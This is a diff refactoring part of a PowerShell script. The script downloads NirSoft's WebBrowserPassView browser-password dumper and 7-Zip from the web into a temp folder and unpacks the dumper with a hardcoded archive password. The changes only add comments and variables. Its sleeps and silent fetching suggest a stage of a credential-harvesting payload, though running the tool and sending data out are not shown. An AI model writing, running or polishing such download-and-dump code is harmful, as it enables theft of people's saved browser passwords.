@@ -9,14 +9,30 @@ Set-Location $tmpfolder
 
 Start-Sleep -Seconds 3
 
-Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
-Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
+# Download the Web Browser Password View zip file
+$wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
+$wbpvZip = 'wbpv.zip'
+$refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}
 
+Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip
+
+# Download the 7-Zip command line version
+$sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
+$sevenZipZip = '7z.zip'
+
+Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip
+
+# Wait for the downloads to complete
 Start-Sleep -Seconds 5
 
-Expand-Archive '7z.zip'
+# Extract the 7-Zip archive
+Expand-Archive -Path $sevenZipZip -DestinationPath '7z'
 
-Start-Process -FilePath '.\7z\7za.exe' -ArgumentList "e", "wbpv.zip", "-pwbpv28821@" -Wait
+# Extract the Web Browser Password View zip file using 7-Zip
+$sevenZipPath = '.\7z\7za.exe'
+$extractionPassword = 'wbpv28821@'
+Start-Process -FilePath $sevenZipPath -ArgumentList "e", $wbpvZip, "-p$extractionPassword" -Wait
+
 
 
 Start-Sleep -Seconds 5
